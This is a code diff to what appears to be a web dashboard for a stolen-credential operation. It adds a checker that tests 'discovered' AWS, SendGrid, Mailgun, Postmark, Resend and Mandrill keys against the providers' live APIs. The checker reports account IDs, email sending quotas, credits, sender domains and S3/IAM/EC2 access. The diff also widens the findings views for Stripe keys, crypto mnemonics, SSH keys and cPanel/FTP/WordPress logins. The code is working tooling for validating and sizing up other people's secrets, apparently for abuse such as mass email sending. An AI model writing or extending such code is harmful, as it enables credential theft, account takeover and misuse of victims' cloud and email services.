@@ -7870,11 +7870,255 @@ def _tg_send(text: str) -> dict:
         return {'ok': False, 'error': str(e)}
 
 
+def _rich_recheck(cred_type: str, key_value: str, source_url: str, metadata: str) -> dict:
+    """Validate a credential and return {live, info, extra, rich} where
+    extra is a list of {key, value} pairs for the detail panel and
+    rich is a provider-specific dict stored verbatim in verify_meta."""
+    import urllib.request as _ur, json as _j
+    extra = []
+    rich = {}
+    live = False
+    info = ''
+
+    try:
+        # ── AWS ─────────────────────────────────────────────────────────
+        if cred_type == 'AWS':
+            ak = source_url if (source_url and source_url.startswith('AKIA')) else key_value
+            sk = key_value if (source_url and source_url.startswith('AKIA')) else (metadata or '')
+            if not (ak and ak.startswith('AKIA') and sk):
+                return {'live': False, 'info': 'Could not parse AWS key pair', 'extra': [], 'rich': {}}
+            import boto3 as _b3
+            sts = _b3.client('sts', aws_access_key_id=ak, aws_secret_access_key=sk, region_name='us-east-1')
+            identity = sts.get_caller_identity()
+            live = True
+            account = identity.get('Account', '')
+            arn = identity.get('Arn', '')
+            info = f"Account: {account} | ARN: {arn}"
+            extra = [
+                {'key': 'ACCOUNT ID', 'value': account},
+                {'key': 'ARN', 'value': arn},
+                {'key': 'USER ID', 'value': identity.get('UserId', '')},
+            ]
+            # SES quota
+            try:
+                ses = _b3.client('ses', aws_access_key_id=ak, aws_secret_access_key=sk, region_name='us-east-1')
+                q = ses.get_send_quota()
+                extra += [
+                    {'key': 'SES DAILY MAX', 'value': str(int(q.get('Max24HourSend', 0)))},
+                    {'key': 'SES SENT (24H)', 'value': str(int(q.get('SentLast24Hours', 0)))},
+                    {'key': 'SES RATE/SEC', 'value': str(q.get('MaxSendRate', 0))},
+                ]
+                rich['sesQuota'] = {
+                    'max24h': int(q.get('Max24HourSend', 0)),
+                    'sent24h': int(q.get('SentLast24Hours', 0)),
+                    'ratePerSecond': q.get('MaxSendRate', 0),
+                    'sandbox': int(q.get('Max24HourSend', 0)) <= 200,
+                }
+            except Exception:
+                pass
+            # CLI-style service probe
+            services_found = []
+            probes = [
+                ('s3', lambda c: c.list_buckets()),
+                ('iam', lambda c: c.list_users(MaxItems=1)),
+                ('ec2', lambda c: c.describe_regions()),
+            ]
+            for svc, fn in probes:
+                try:
+                    fn(_b3.client(svc, aws_access_key_id=ak, aws_secret_access_key=sk, region_name='us-east-1'))
+                    services_found.append(svc.upper())
+                except Exception:
+                    pass
+            if services_found:
+                extra.append({'key': 'SERVICES', 'value': ', '.join(services_found)})
+                rich['awsServices'] = services_found
+            rich['awsAccount'] = account
+            rich['awsArn'] = arn
+
+        # ── Resend ──────────────────────────────────────────────────────
+        elif cred_type == 'Resend':
+            req = _ur.Request('https://api.resend.com/domains',
+                              headers={'Authorization': f'Bearer {key_value}'})
+            with _ur.urlopen(req, timeout=10) as r:
+                body = _j.loads(r.read())
+            live = True
+            domains = [d.get('name', '') for d in body.get('data', [])]
+            total_sent = sum(d.get('records', [{}])[0].get('value', 0) if d.get('records') else 0
+                             for d in body.get('data', []))
+            info = f"{len(domains)} domain(s): {', '.join(domains[:3])}"
+            extra = [
+                {'key': 'DOMAINS', 'value': str(len(domains))},
+                {'key': 'DOMAIN LIST', 'value': ', '.join(domains[:8]) or '—'},
+            ]
+            # Fetch API key info for quota
+            try:
+                req2 = _ur.Request('https://api.resend.com/api-keys',
+                                   headers={'Authorization': f'Bearer {key_value}'})
+                with _ur.urlopen(req2, timeout=10) as r2:
+                    keys_body = _j.loads(r2.read())
+                key_count = len(keys_body.get('data', []))
+                extra.append({'key': 'API KEYS', 'value': str(key_count)})
+            except Exception:
+                pass
+            rich['senderDomains'] = domains
+
+        # ── SendGrid ────────────────────────────────────────────────────
+        elif cred_type == 'SendGrid':
+            req = _ur.Request('https://api.sendgrid.com/v3/user/account',
+                              headers={'Authorization': f'Bearer {key_value}'})
+            with _ur.urlopen(req, timeout=10) as r:
+                acct = _j.loads(r.read())
+            live = True
+            plan = acct.get('type', '')
+            rep_score = acct.get('reputation', 0)
+            info = f"Plan: {plan} | Reputation: {rep_score}"
+            extra = [
+                {'key': 'PLAN', 'value': plan},
+                {'key': 'REPUTATION', 'value': str(rep_score)},
+            ]
+            # Monthly credits
+            try:
+                req2 = _ur.Request('https://api.sendgrid.com/v3/user/credits',
+                                   headers={'Authorization': f'Bearer {key_value}'})
+                with _ur.urlopen(req2, timeout=10) as r2:
+                    cred = _j.loads(r2.read())
+                remain = cred.get('remain', 0)
+                total = cred.get('total', 0)
+                overage = cred.get('overage', 0)
+                extra += [
+                    {'key': 'CREDITS REMAINING', 'value': f"{remain:,}"},
+                    {'key': 'CREDITS TOTAL', 'value': f"{total:,}"},
+                ]
+                rich['monthlyCredits'] = total
+                if overage:
+                    extra.append({'key': 'OVERAGE', 'value': str(overage)})
+            except Exception:
+                pass
+            # Sender domains
+            try:
+                req3 = _ur.Request('https://api.sendgrid.com/v3/whitelabel/domains',
+                                   headers={'Authorization': f'Bearer {key_value}'})
+                with _ur.urlopen(req3, timeout=10) as r3:
+                    doms = _j.loads(r3.read())
+                domain_names = [d.get('domain', '') for d in (doms if isinstance(doms, list) else [])]
+                if domain_names:
+                    extra.append({'key': 'SENDER DOMAINS', 'value': ', '.join(domain_names[:5])})
+                    rich['senderDomains'] = domain_names
+            except Exception:
+                pass
+
+        # ── Mailgun ─────────────────────────────────────────────────────
+        elif cred_type == 'Mailgun':
+            import base64 as _b64
+            token = _b64.b64encode(f'api:{key_value}'.encode()).decode()
+            req = _ur.Request('https://api.mailgun.net/v3/domains',
+                              headers={'Authorization': f'Basic {token}'})
+            with _ur.urlopen(req, timeout=10) as r:
+                body = _j.loads(r.read())
+            live = True
+            items = body.get('items', [])
+            domains = [d.get('name', '') for d in items]
+            states = [d.get('state', '') for d in items]
+            info = f"{len(domains)} domain(s): {', '.join(domains[:3])}"
+            extra = [
+                {'key': 'DOMAINS', 'value': str(len(domains))},
+                {'key': 'DOMAIN LIST', 'value': ', '.join(domains[:5]) or '—'},
+                {'key': 'STATES', 'value': ', '.join(set(states)) or '—'},
+            ]
+            # Quota / limits per domain
+            for d in items[:2]:
+                dlimit = d.get('sending_limit', {})
+                if dlimit:
+                    extra.append({'key': f"LIMIT ({d.get('name','')})", 'value': str(dlimit)})
+            rich['senderDomains'] = domains
+
+        # ── Postmark ─────────────────────────────────────────────────────
+        elif cred_type == 'Postmark':
+            req = _ur.Request('https://api.postmarkapp.com/server',
+                              headers={'X-Postmark-Server-Token': key_value,
+                                       'Accept': 'application/json'})
+            with _ur.urlopen(req, timeout=10) as r:
+                svr = _j.loads(r.read())
+            live = True
+            name = svr.get('Name', '')
+            color = svr.get('Color', '')
+            smtp_api = svr.get('SmtpApiActivated', False)
+            info = f"Server: {name} | SMTP: {smtp_api}"
+            extra = [
+                {'key': 'SERVER NAME', 'value': name},
+                {'key': 'COLOR', 'value': color},
+                {'key': 'SMTP API', 'value': 'Active' if smtp_api else 'Inactive'},
+                {'key': 'SERVER ID', 'value': str(svr.get('ID', ''))},
+            ]
+            # Sending stats
+            try:
+                req2 = _ur.Request('https://api.postmarkapp.com/stats/outbound',
+                                   headers={'X-Postmark-Server-Token': key_value,
+                                            'Accept': 'application/json'})
+                with _ur.urlopen(req2, timeout=10) as r2:
+                    stats = _j.loads(r2.read())
+                sent = stats.get('Sent', 0)
+                opens = stats.get('Opens', 0)
+                extra += [
+                    {'key': 'TOTAL SENT', 'value': f"{sent:,}"},
+                    {'key': 'TOTAL OPENS', 'value': f"{opens:,}"},
+                ]
+                rich['sentLast30d'] = sent
+            except Exception:
+                pass
+
+        # ── Mandrill ─────────────────────────────────────────────────────
+        elif cred_type == 'Mandrill':
+            data = _j.dumps({'key': key_value}).encode()
+            req = _ur.Request('https://mandrillapp.com/api/1.0/users/info',
+                              data=data, method='POST',
+                              headers={'Content-Type': 'application/json'})
+            with _ur.urlopen(req, timeout=10) as r:
+                body = _j.loads(r.read())
+            live = True
+            username = body.get('username', '')
+            reputation = body.get('reputation', 0)
+            hourly_quota = body.get('hourly_quota', 0)
+            backlog = body.get('backlog', 0)
+            info = f"User: {username} | Quota: {hourly_quota}/hr | Rep: {reputation}"
+            extra = [
+                {'key': 'USERNAME', 'value': username},
+                {'key': 'REPUTATION', 'value': str(reputation)},
+                {'key': 'HOURLY QUOTA', 'value': f"{hourly_quota:,}"},
+                {'key': 'BACKLOG', 'value': str(backlog)},
+            ]
+            # Sending stats
+            try:
+                req2 = _ur.Request('https://mandrillapp.com/api/1.0/users/senders',
+                                   data=data, method='POST',
+                                   headers={'Content-Type': 'application/json'})
+                with _ur.urlopen(req2, timeout=10) as r2:
+                    senders = _j.loads(r2.read())
+                total_sent = sum(s.get('sent', 0) for s in (senders if isinstance(senders, list) else []))
+                if total_sent:
+                    extra.append({'key': 'TOTAL SENT', 'value': f"{total_sent:,}"})
+                    rich['sentLast30d'] = total_sent
+            except Exception:
+                pass
+            rich['monthlyCredits'] = hourly_quota * 24 * 30
+
+        else:
+            return {'live': False, 'info': f'{cred_type} validation not implemented', 'extra': [], 'rich': {}}
+
+    except Exception as e:
+        err = str(e)
+        # HTTP errors embed the status code in the string
+        if '401' in err or '403' in err or 'Unauthorized' in err or 'Forbidden' in err:
+            return {'live': False, 'info': f'Invalid key: {err[:200]}', 'extra': [], 'rich': {}}
+        return {'live': False, 'info': err[:300], 'extra': [], 'rich': {}}
+
+    rich['extra'] = extra
+    return {'live': live, 'info': info, 'extra': extra, 'rich': rich}
+
+
 @app.route('/api/credentials/<int:cred_id>/recheck', methods=['POST'])
 def api_credentials_recheck(cred_id: int):
-    """Re-validate a discovered credential against its live API.
-    Currently supports AWS (STS GetCallerIdentity) and Stripe.
-    Other types return status=unchecked."""
+    """Re-validate a credential and return rich structured data for the detail panel."""
     try:
         conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
@@ -7885,44 +8129,25 @@ def api_credentials_recheck(cred_id: int):
             return jsonify({'ok': False, 'error': 'Not found'}), 404
         cred_type, key_value, source_url, metadata = row
 
-        live = False
-        info = ''
-        try:
-            # AWS — detect AKIA format. source_url may be the access key (old format)
-            # or the domain (new format with key_value=AKIA...).
-            ak, sk = None, None
-            if cred_type == 'AWS':
-                if source_url and source_url.startswith('AKIA'):
-                    ak, sk = source_url, key_value
-                elif key_value and key_value.startswith('AKIA'):
-                    ak = key_value
-                    sk = metadata or ''
-                if ak and sk:
-                    import boto3
-                    sts = boto3.client('sts', aws_access_key_id=ak, aws_secret_access_key=sk)
-                    identity = sts.get_caller_identity()
-                    live = True
-                    info = f"Account: {identity.get('Account')} ARN: {identity.get('Arn')}"
-            elif cred_type == 'Stripe':
-                import urllib.request
-                req = urllib.request.Request(
-                    'https://api.stripe.com/v1/balance',
-                    headers={'Authorization': f'Bearer {key_value}'}
-                )
-                with urllib.request.urlopen(req, timeout=8) as r:
-                    live = r.status == 200
-                    info = 'Balance endpoint OK'
-        except Exception as e:
-            info = str(e)[:200]
-
+        result = _rich_recheck(cred_type, key_value, source_url or '', metadata or '')
+        live = result['live']
         new_status = 'valid' if live else 'dead'
+        verify_meta_json = json.dumps(result['rich']) if result['rich'] else result['info']
+
         c.execute(
             'UPDATE credentials SET status=?, last_verified=CURRENT_TIMESTAMP, verify_meta=? WHERE id=?',
-            (new_status, info, cred_id)
+            (new_status, verify_meta_json, cred_id)
         )
         conn.commit()
         conn.close()
-        return jsonify({'ok': True, 'live': live, 'status': new_status, 'info': info})
+        return jsonify({
+            'ok': True,
+            'live': live,
+            'status': new_status,
+            'info': result['info'],
+            'extra': result['extra'],
+            'rich': result['rich'],
+        })
     except Exception as e:
         return jsonify({'ok': False, 'error': str(e)}), 500
 
@@ -7974,7 +8199,7 @@ def api_findings_stripe():
         c = conn.cursor()
         c.execute('''SELECT id, type, key_value, source_url, status, metadata,
                             timestamp, reported, last_verified, verify_meta
-                     FROM credentials WHERE type = 'Stripe' AND status = 'valid'
+                     FROM credentials WHERE type = 'Stripe' AND status IN ('valid', 'hit')
                      ORDER BY id DESC LIMIT 5000''')
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
@@ -7993,7 +8218,7 @@ def api_findings_crypto():
         c.execute('''SELECT id, type, key_value, source_url, status, metadata,
                             timestamp, reported, last_verified, verify_meta
                      FROM credentials
-                     WHERE type IN ('Crypto', 'Mnemonic') AND status = 'valid'
+                     WHERE type IN ('Crypto', 'Mnemonic') AND status IN ('valid', 'hit')
                      ORDER BY id DESC LIMIT 5000''')
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
@@ -8280,7 +8505,7 @@ def api_findings_database():
                             timestamp, reported, last_verified, verify_meta
                      FROM credentials
                      WHERE type IN ('MySQL', 'PostgreSQL', 'Database', 'DB')
-                           AND status = 'valid'
+                           AND status IN ('valid', 'hit')
                      ORDER BY id DESC LIMIT 5000''')
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
@@ -8300,7 +8525,7 @@ def api_findings_webpanels():
                      FROM credentials
                      WHERE type IN ('cPanel', 'FTP', 'WordPress', 'WebPanel',
                                     'Cpanel', 'cpanel', 'ftp', 'wordpress')
-                           AND status = 'valid'
+                           AND status IN ('valid', 'hit')
                      ORDER BY id DESC LIMIT 5000''')
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
@@ -8320,7 +8545,7 @@ def api_findings_ssh():
                      FROM credentials
                      WHERE type IN ('SSH', 'ssh', 'SSH_Key', 'SSHKey',
                                     'ssh_key', 'SSH_KEYS')
-                           AND status = 'valid'
+                           AND status IN ('valid', 'hit')
                      ORDER BY id DESC LIMIT 5000''')
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
